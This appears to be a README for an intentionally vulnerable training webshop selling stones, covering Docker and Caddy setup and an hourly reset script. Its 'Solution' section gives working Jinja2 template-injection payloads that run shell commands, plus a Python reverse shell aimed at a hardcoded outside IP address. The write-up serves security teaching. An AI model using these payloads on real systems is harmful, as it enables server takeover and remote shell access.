# LIA:
Webshop selling different stones and minerals

# Configuration, Setup & Run
All configuration can be done in `docker-compose.yml`  
Pay special attention to the port configuration of the php application. It is by default
set to listen only to localhost on port 50000. It is recommended to keep the services internal
and layer it behind a reverse proxy such as nginx with https and appropriate security settings.


To run this you'll need Docker and Docker-compose. Simply build and run it
with the following command:
```
docker-compose up --build -d
```

# Starting point
The application is provided "as is" and no pre-created accounts are needed.


# Run as a Droplet Digital ocean

Make sure the app is up and running and that you asign a (sub)domain and that it works. Then install Caddy Rev proxy for easy https

Add caddy for https and stuff:
```
sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
sudo apt update
sudo apt install caddy
```

Edit /etc/caddy/Caddyfile :

```
lia.appsec.nu {

        reverse_proxy localhost:5000
                header {
                server: HappyHacking
        }
        log {
		output file /var/log/caddy/access.log
  		}
```
restart caddy:

```
sytemctl restart caddy
```

View logs live:

```
tail -f /var/log/caddy/access.log | jq
tail -f /var/log/caddy/access.log | jq  '[.resp_headers.Date[],.request.headers."User-Agent",.request.method, .request .uri, .request .remote_ip]'
```


# ***Add deploy-script and auto-reset via crontab

You could add a deploy.sh like below MIND the path:
```
sudo docker-compose down -v
sudo docker rm -f $(sudo docker ps -a -q)
sudo docker system prune -a -f
sudo docker-compose -f /root/lia/docker-compose.yml up --build -d
```

Add to crontab with:
```
sudo crontab -e
```
and add something like this (resets minute 0 every hour) MIND the path:

```
0 * * * * /bin/sh /root/stone/app2/deploy.sh >/dev/null 2>&1

```
# Solution:

Find availibel mro's and the number by using the following payload in name or cover letter input fields (in this particular docker container it was 351)

```
{{ ''.__class__.__mro__[1].__subclasses__() | map(attribute='__name__') | list }}
```

List files or make simple commands:

```
{{ ''.__class__.__mro__[1].__subclasses__()[351]('ls', shell=True, stdout=-1).communicate()[0] }}
```
```
{{ ''.__class__.__mro__[1].__subclasses__()[351]('echo Mikael >> lia.txt', shell=True, stdout=-1).communicate() }}

```
Or maybe the simplest variant

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Create a reverse shell python file:
```
{{ ''.__class__.__mro__[1].__subclasses__()[351]('echo "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\'167.99.247.129\',9999)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\'/bin/sh\',\'-i\']);" > /tmp/reverse_shell.py', shell=True, stdout=-1).communicate() }}
```

Execute the reverse shell:
```
{{ ''.__class__.__mro__[1].__subclasses__()[351]('python3 /tmp/reverse_shell.py', shell=True, stdout=-1).communicate() }}
```



# Author
Created by Mikael Svall 2024
